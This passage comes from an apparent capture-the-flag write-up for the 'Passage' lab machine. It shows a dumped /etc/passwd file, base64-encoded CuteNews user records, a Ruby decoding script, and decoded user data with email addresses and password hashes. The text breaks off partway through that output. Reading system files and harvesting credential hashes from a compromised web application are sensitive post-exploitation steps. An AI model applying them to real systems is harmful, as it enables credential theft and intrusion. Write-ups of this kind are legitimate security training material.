</span></span><span class=line><span class=cl><span class=n>backup</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=n>backup</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>list</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=n>Mailing</span> <span class=n>List</span> <span class=n>Manager</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>list</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>irc</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>gnats</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=n>Gnats</span> <span class=n>Bug</span><span class=o>-</span><span class=n>Reporting</span> <span class=n>System</span> <span class=p>(</span><span class=n>admin</span><span class=p>):</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>gnats</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>nobody</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>nobody</span><span class=p>:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>timesync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>100</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Time</span> <span class=n>Synchronization</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>network</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>101</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Network</span> <span class=n>Management</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>netif</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>resolve</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Resolver</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>resolve</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>bus</span><span class=o>-</span><span class=n>proxy</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=mi>105</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Bus</span> <span class=n>Proxy</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>syslog</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=mi>108</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>syslog</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>_apt</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>105</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>messagebus</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>106</span><span class=p>:</span><span class=mi>110</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>dbus</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>uuidd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>107</span><span class=p>:</span><span class=mi>111</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>uuidd</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>lightdm</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>108</span><span class=p>:</span><span class=mi>114</span><span class=p>:</span><span class=ne>Light</span> <span class=n>Display</span> <span class=n>Manager</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>lightdm</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>whoopsie</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>109</span><span class=p>:</span><span class=mi>117</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>avahi</span><span class=o>-</span><span class=n>autoipd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>110</span><span class=p>:</span><span class=mi>119</span><span class=p>:</span><span class=n>Avahi</span> <span class=n>autoip</span> <span class=n>daemon</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>avahi</span><span class=o>-</span><span class=n>autoipd</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>avahi</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>111</span><span class=p>:</span><span class=mi>120</span><span class=p>:</span><span class=n>Avahi</span> <span class=n>mDNS</span> <span class=n>daemon</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>avahi</span><span class=o>-</span><span class=n>daemon</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>dnsmasq</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>112</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>dnsmasq</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>misc</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>colord</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>113</span><span class=p>:</span><span class=mi>123</span><span class=p>:</span><span class=n>colord</span> <span class=n>colour</span> <span class=n>management</span> <span class=n>daemon</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>colord</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>speech</span><span class=o>-</span><span class=n>dispatcher</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>114</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=n>Speech</span> <span class=n>Dispatcher</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>speech</span><span class=o>-</span><span class=n>dispatcher</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>hplip</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>115</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=n>HPLIP</span> <span class=n>system</span> <span class=n>user</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>hplip</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>kernoops</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>116</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>Kernel</span> <span class=n>Oops</span> <span class=n>Tracking</span> <span class=n>Daemon</span><span class=p>,,,:</span><span class=o>/</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>pulse</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>117</span><span class=p>:</span><span class=mi>124</span><span class=p>:</span><span class=n>PulseAudio</span> <span class=n>daemon</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>pulse</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>rtkit</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>118</span><span class=p>:</span><span class=mi>126</span><span class=p>:</span><span class=n>RealtimeKit</span><span class=p>,,,:</span><span class=o>/</span><span class=n>proc</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>saned</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>119</span><span class=p>:</span><span class=mi>127</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>saned</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>usbmux</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>120</span><span class=p>:</span><span class=mi>46</span><span class=p>:</span><span class=n>usbmux</span> <span class=n>daemon</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>usbmux</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>nadav</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=n>Nadav</span><span class=p>,,,:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>nadav</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>paul</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=n>Paul</span> <span class=n>Coles</span><span class=p>,,,:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>paul</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>sshd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>121</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>sshd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-www-data-to-paul>Privilege Escalation of Machine : from www-data to paul<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-www-data-to-paul>#</a></h2><p>The folder <code>/var/www/html/CuteNews/cdata/users</code> contains users information
in various files, eg. <code>09.php</code> etc. and the data is base64 encoded.
So it&rsquo;s not easy to find info about a particular user at a glance.</p><p>With <code>cat ??.php</code> I displayed info about all users and then stripped the
php directive to keep only the base64 data.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
</span></span><span class=line><span class=cl>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
</span></span><span class=line><span class=cl>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319
</span></span><span class=line><span class=cl>YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxMDoiMTU5OTQ4NDMzMiI7czozOiJjbnQiO3M6MToiMiI7fX19
</span></span><span class=line><span class=cl>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODkxMDg5NjtzOjY6ImhhY2tlciI7fX0=
</span></span><span class=line><span class=cl>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6Im5vcmFqQGh0Yi5sb2NhbCI7czo1OiJub3JhaiI7fX0=
</span></span><span class=line><span class=cl>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=
</span></span><span class=line><span class=cl>YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJub3JhaiI7YToxMTp7czoyOiJpZCI7czoxMDoiMTU5OTQ4NDM5NSI7czo0OiJuYW1lIjtzOjU6Im5vcmFqIjtzOjM6ImFjbCI7czoxOiI0IjtzOjU6ImVtYWlsIjtzOjE1OiJub3JhakBodGIubG9jYWwiO3M6NDoibmljayI7czo1OiJub3JhaiI7czo0OiJwYXNzIjtzOjY0OiI0ZDlmNzU2ZDM2ZjgyODk2ZDk2YzVlOTEzMTA1MTExN2E2ZThjNWZkODlhMTY5ZjA0NDBjNDZhODUzZTJjNDRiIjtzOjM6Imx0cyI7czoxMDoiMTU5OTQ4OTQwOSI7czozOiJiYW4iO3M6MToiMCI7czo0OiJtb3JlIjtzOjYwOiJZVG95T250ek9qUTZJbk5wZEdVaU8zTTZNRG9pSWp0ek9qVTZJbUZpYjNWMElqdHpPakE2SWlJN2ZRPT0iO3M6NjoiYXZhdGFyIjtzOjI1OiJhdmF0YXJfbm9yYWpfeGN0eHVkanMucGhwIjtzOjY6ImUtaGlkZSI7czowOiIiO319fQ==
</span></span><span class=line><span class=cl>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==
</span></span><span class=line><span class=cl>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319
</span></span><span class=line><span class=cl>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MjA6ImhhY2tlckBoYWNrZXIuaGFja2VyIjtzOjY6ImhhY2tlciI7fX0=
</span></span><span class=line><span class=cl>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==
</span></span><span class=line><span class=cl>YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
</span></span><span class=line><span class=cl>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==
</span></span><span class=line><span class=cl>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319
</span></span><span class=line><span class=cl>YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19
</span></span><span class=line><span class=cl>YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=
</span></span><span class=line><span class=cl>YToxOntzOjQ6Im5hbWUiO2E6Mjp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg5MDY4ODEiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3lreG5hY3B0LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9czo2OiJoYWNrZXIiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg5MTA4OTYiO3M6NDoibmFtZSI7czo2OiJoYWNrZXIiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjA6ImhhY2tlckBoYWNrZXIuaGFja2VyIjtzOjQ6Im5pY2siO3M6NjoiaGFja2VyIjtzOjQ6InBhc3MiO3M6NjQ6ImU3ZDM2ODU3MTU5Mzk4NDI3NDljYzI3YjM4ZDBjY2I5NzA2ZDRkMTRhNTMwNGVmOWVlZTA5Mzc4MGVhYjVkZjkiO3M6MzoibHRzIjtzOjEwOiIxNTk4OTEwOTExIjtzOjM6ImJhbiI7czoxOiIwIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czo2OiJhdmF0YXIiO3M6MjY6ImF2YXRhcl9oYWNrZXJfanB5b3lza3QucGhwIjtzOjY6ImUtaGlkZSI7czowOiIiO319fQ==
</span></span><span class=line><span class=cl>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5OTQ4NDM5NTtzOjU6Im5vcmFqIjt9fQ==
</span></span><span class=line><span class=cl>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0
</span></span></code></pre></td></tr></table></div></div><p>Then I wrote a short ruby script (using <a href=https://github.com/cyfun/ctf-party>ctf-party</a> lib) to base64 decode each line.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;ctf_party&#39;</span>
</span></span><span class=line><span class=cl><span class=no>File</span><span class=o>.</span><span class=n>readlines</span><span class=p>(</span><span class=s1>&#39;usersb64.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>each</span> <span class=k>do</span> <span class=o>|</span><span class=n>line</span><span class=o>|</span>
</span></span><span class=line><span class=cl>    <span class=nb>puts</span> <span class=n>line</span><span class=o>.</span><span class=n>chomp</span><span class=o>.</span><span class=n>from_b64</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span></code></pre></td></tr></table></div></div><p>I obtained the following result by running <code>ruby usersb64.rb</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>16</span><span class=o>:</span><span class=s2>&#34;paul@passage.htb&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;paul-coles&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>1598829833</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;egre55&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=s2>&#34;egre55@test.com&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;egre55&#34;</span><span class=p>;}}</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;admin&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;id&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1592483047&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;admin&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;acl&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;1&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;email&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>17</span><span class=o>:</span><span class=s2>&#34;nadav@passage.htb&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;pass&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>64</span><span class=o>:</span><span class=s2>&#34;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;lts&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1592487988&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;ban&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;1599484332&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span 